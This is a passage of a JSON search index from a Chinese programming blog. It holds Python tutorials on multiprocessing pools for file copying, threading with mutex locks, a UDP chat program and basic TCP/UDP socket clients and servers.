args=(s,))#apply_async(要调用的目标,args=(传递的参数,)) p.close()#关闭进程池，关闭后进程池不再接受新的请求 p.join()#等待所有子进程执行完毕，必须放在close语句后 案例：多任务文件copy12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import os,sysfrom multiprocessing import Pool,Managerdef copy_file(q,file_name,old_dir,new_dir): #print(&quot;将 &#123;&#125; 文件复制到 &#123;&#125; 目录下&quot;.format(file_name,new_dir)) if os.path.isdir(old_dir + &quot;\\\\&quot; + file_name): # print(file_name,&quot;是个目录&quot;) q.put(file_name) else: #print(file_name,&quot;是个文件&quot;) with open(old_dir + &quot;\\\\&quot; + file_name,&#x27;rb&#x27;) as file: with open(new_dir + &quot;\\\\&quot; + file_name,&quot;wb&quot;) as file_new: file_new.write(file.read())def main(): # 1、获取要拷贝的文件名 print(&quot;注意！此程序不完善，尚不能copy文件夹中文件夹的文件&quot;) old_dir = input(r&quot;输入需要copy的源文件夹路径,如(C:\\null):&quot;) # 2、创建新文件夹 new_dir = input(r&quot;输入需要copy的目标文件夹路径,如(C:\\null_副件):&quot;) try: os.mkdir(new_dir) except: pass # 3、获取所有需要copy文件名 files_name = os.listdir(old_dir) # 4、创建进程池 po = Pool(5) # 进程池使用队列需要使用Manager类下的Queue q = Manager().Queue() # 5、向进程池添加复制文件的任务 for file_name in files_name: po.apply_async(copy_file,args=(q,file_name,old_dir,new_dir)) po.close() #po.join() copy_ok = 0 copy_num = len(files_name) folders = [] while True: copy_ok += 1 sys.stdout.write(&quot;\\r拷贝进度:&#123;:.2f&#125;%&quot;.format(copy_ok*100/copy_num)) try: folders.append(q.get_nowait()) except: pass #将未拷贝的文件夹存入列表 if copy_ok &gt;= copy_num: break print(&quot;\\n以下文件夹未复制:&quot;,&quot;,&quot;.join(folders)) if __name__ == &quot;__main__&quot;: main() 参考:multiprocessing — 基于进程的并行 — Python 3.9.5 文档","categories":[{"name":"Python3","slug":"Python3","permalink":"https://xin02.github.io/categories/Python3/"}],"tags":[{"name":"多进程","slug":"多进程","permalink":"https://xin02.github.io/tags/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"},{"name":"队列","slug":"队列","permalink":"https://xin02.github.io/tags/%E9%98%9F%E5%88%97/"},{"name":"进程池","slug":"进程池","permalink":"https://xin02.github.io/tags/%E8%BF%9B%E7%A8%8B%E6%B1%A0/"}]},{"title":"Python3 多线程","slug":"Python3-多线程","date":"2021-06-05T12:28:00.000Z","updated":"2022-07-01T12:29:49.232Z","comments":true,"path":"2021/06/05/Python3-多线程/","link":"","permalink":"https://xin02.github.io/2021/06/05/Python3-%E5%A4%9A%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"简单实现多线程123456789101112131415161718192021import threadingimport timedef sing(sing): for i in range(5): print(&quot;---sing()---&#123;&#125;&quot;.format(sing)) time.sleep(1)def dance(dance): for i in range(5): print(&quot;---dance()---&#123;&#125;&quot;.format(dance)) time.sleep(1)def main(): t1 = threading.Thread(target=sing,args=(&quot;t1&quot;,)) t2 = threading.Thread(target=dance,args=(&quot;t2&quot;,)) t1.start() t2.start()if __name__ == &quot;__main__&quot;: main() 多线程互斥锁123456789101112131415161718192021222324252627282930313233343536373839import threadingimport timeA = 2lock = threading.Lock()#创建一个互斥锁def sing(sing): global A for i in range(500000): lock.acquire() #加锁 A += 1 lock.release() #解锁 print(&#x27;&#123;&#125;:&#123;&#125;&#x27;.format(sing,i))def dance(dance): global A for i in range(500000): lock.acquire() #加锁 A -= 1 lock.release() #解锁 print(&#x27;&#123;&#125;:&#123;&#125;&#x27;.format(dance,i))def main(): global A t1 = threading.Thread(target=sing,args=(&quot;t1&quot;,)) t2 = threading.Thread(target=dance,args=(&quot;t2&quot;,)) t1.start() t2.start() t1.join() t2.join() print(A)if __name__ == &quot;__main__&quot;: main() 查看线程数量使用 1threading.enumerate() 获取当前所有线程。 此处打印出一个列表，列表中共有3个线程信息。一个是主线程，另外两个是子线程 这里需要注意，我们需要在代码中使用join()方法来阻塞主线程。当所有阻塞的子线程执行完毕后，才会继续执行主线程。 通过继承Thread类，重写run方法实现多线程1234567891011121314151617181920212223242526272829303132333435363738394041import threadingimport timeA = 2lock = threading.Lock()#创建一个互斥锁class my_thread(threading.Thread): def run(self) -&gt; None: self.sing() def sing(self): global A if self._kwargs[&#x27;mothed&#x27;] == &#x27;add&#x27;: tmp = 1 elif self._kwargs[&#x27;mothed&#x27;] == &#x27;del&#x27;: tmp = -1 else: tmp = 1 for i in range(50): lock.acquire() #加锁 A += tmp lock.release() #解锁 print(&#x27;&#123;&#125;:&#123;&#125;:&#123;&#125;&#x27;.format(self._kwargs[&#x27;cs&#x27;],i,A))def main(): global A t1 = my_thread(kwargs=&#123;&#x27;cs&#x27;:&#x27;sing&#x27;,&#x27;mothed&#x27;:&#x27;add&#x27;&#125;,name=&quot;T1&quot;) t2 = my_thread(kwargs=&#123;&#x27;cs&#x27;:&#x27;dance&#x27;,&#x27;mothed&#x27;:&#x27;del&#x27;&#125;,name=&quot;T2&quot;) t1.start() t2.start() print(threading.enumerate()) print(A) t1.join() t2.join() print(A)if __name__ == &quot;__main__&quot;: main() 多线程UDP聊天器12345678910111213141516171819202122232425262728293031323334353637import threadingimport socketclass my_thread(threading.Thread): def run(self) -&gt; None: if self._kwargs[&#x27;mothed&#x27;] == &#x27;recv_message&#x27;: self.recv_message() elif self._kwargs[&#x27;mothed&#x27;] == &#x27;send_message&#x27;: self.send_message() def send_message(self): while True: try: ip = input(&quot;目标IP:&quot;) port = int(input(&quot;目标端口:&quot;)) msg = input(&quot;发送的消息:&quot;).encode(&#x27;utf-8&#x27;) except: continue self._kwargs[&#x27;udp_socket&#x27;].sendto(msg,(ip,port)) def recv_message(self): while True: data,client_addr = self._kwargs[&#x27;udp_socket&#x27;].recvfrom(1024) print(&#x27;source:&#x27;, client_addr,&#x27;收到的数据：&#x27;, data.decode(&quot;UTF-8&quot;))def main(): udp_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) udp_socket.bind((&quot;&quot;,20216)) recv_message = my_thread(kwargs=&#123;&#x27;udp_socket&#x27;:udp_socket,&#x27;mothed&#x27;:&#x27;recv_message&#x27;&#125;,name=&quot;recv_message&quot;) send_message = my_thread(kwargs=&#123;&#x27;udp_socket&#x27;:udp_socket,&#x27;mothed&#x27;:&#x27;send_message&#x27;&#125;,name=&quot;send_message&quot;) recv_message.start() send_message.start() recv_message.join() send_message.join()if __name__ == &quot;__main__&quot;: main()","categories":[{"name":"Python3","slug":"Python3","permalink":"https://xin02.github.io/categories/Python3/"}],"tags":[{"name":"多线程","slug":"多线程","permalink":"https://xin02.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"互斥锁","slug":"互斥锁","permalink":"https://xin02.github.io/tags/%E4%BA%92%E6%96%A5%E9%94%81/"}]},{"title":"Python3 网络编程（使用Socket实现TCP、UDP通信）","slug":"Python3-网络编程（使用Socket实现TCP、UDP通信）","date":"2021-06-04T05:08:00.000Z","updated":"2022-07-01T12:29:49.109Z","comments":true,"path":"2021/06/04/Python3-网络编程（使用Socket实现TCP、UDP通信）/","link":"","permalink":"https://xin02.github.io/2021/06/04/Python3-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%EF%BC%88%E4%BD%BF%E7%94%A8Socket%E5%AE%9E%E7%8E%B0TCP%E3%80%81UDP%E9%80%9A%E4%BF%A1%EF%BC%89/","excerpt":"","text":"TCP通信TCP_服务端123456789101112 1 import socket as s 2 3 tcp = s.socket(s.AF_INET,s.SOCK_STREAM) 4 tcp.bind((&#x27;127.0.0.1&#x27;, 6666)) 5 tcp.listen(5) 6 while True: 7 # 建立客户端连接 8 clientsocket,addr = tcp.accept() 9 print(&quot;连接地址: %s&quot; % str(addr))10 msg = &#x27;欢迎访问&#123;&#125;！&#x27;.format(tcp.getsockname())+ &quot;\\r\\n&quot;11 clientsocket.send(msg.encode(&#x27;utf-8&#x27;))12 clientsocket.close() TCP_客户端1234567import socket as stcp = s.socket(s.AF_INET,s.SOCK_STREAM)tcp.connect((&#x27;127.0.0.1&#x27;, 6666))msg = tcp.recv(1024)tcp.close()print (msg.decode(&#x27;utf-8&#x27;)) UDP通信UDP_服务端1234567891011import socketBUFSIZE = 1024ip_port = (&#x27;127.0.0.1&#x27;, 9999)server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # udp协议server.bind(ip_port)while True: data,client_addr = server.recvfrom(BUFSIZE) print(&#x27;client地址：&#x27;, client_addr,&#x27;server收到的数据：&#x27;, data.decode(&quot;UTF-8&quot;)) server.sendto(data,client_addr)server.close() UDP_客户端12345678910111213import socketBUFSIZE = 1024client = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)while True: msg = input(&quot;&gt;&gt;&quot;).strip() ip_port = (&#x27;127.0.0.1&#x27;, 9999) client.sendto(msg.encode(&#x27;utf-8&#x27;),ip_port) data,server_addr = client.recvfrom(BUFSIZE) print(server_addr,&#x27;服务端收到: &#x27;,data.decode(&quot;UTF-8&quot;))client.close()","categories":[{"name":"Python3","slug":"Python3","permalink":"https://xin02.github.io/categories/Python3/"}],"tags":[{"name":"TCP","slug":"TCP","permalink":"https://xin02.github.io/tags/TCP/"},{"name":"UDP","slug":"UDP","permalink":"https://xin02.github.io/tags/UDP/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://xin02.github.io/categories/CTF/"},{"name":"Python3","slug":"Python3","permalink":"https://xin02.github.io/categories/Python3/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xin02.github.io/tags/CTF/"},{"name":"GIT","slug":"GIT","permalink":"https://xin02.github.io/tags/GIT/"},{"name":"WEB","slug":"WEB","permalink":"https://xin02.github.io/tags/WEB/"},{"name":"反序列化","slug":"反序列化","permalink":"https://xin02.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"面向对象","slug":"面向对象","permalink":"https://xin02.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://xin02.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"协程","slug":"协程","permalink":"https://xin02.github.io/tags/%E5%8D%8F%E7%A8%8B/"},{"name":"多进程","slug":"多进程","permalink":"https://xin02.github.io/tags/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"},{"name":"队列","slug":"队列","permalink":"https://xin02.github.io/tags/%E9%98%9F%E5%88%97/"},{"name":"进程池","slug":"进程池","permalink":"https://xin02.github.io/tags/%E8%BF%9B%E7%A8%8B%E6%B1%A0/"},{"name":"多线程","slug":"多线程","permalink":"https://xin02.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"互斥锁","slug":"互斥锁","permalink":"https://xin02.github.io/tags/%E4%BA%92%E6%96%A5%E9%94%81/"},{"name":"TCP","slug":"TCP","permalink":"https://xin02.github.io/tags/TCP/"},{"name":"UDP","slug":"UDP","permalink":"https://xin02.github.io/tags/UDP/"}]}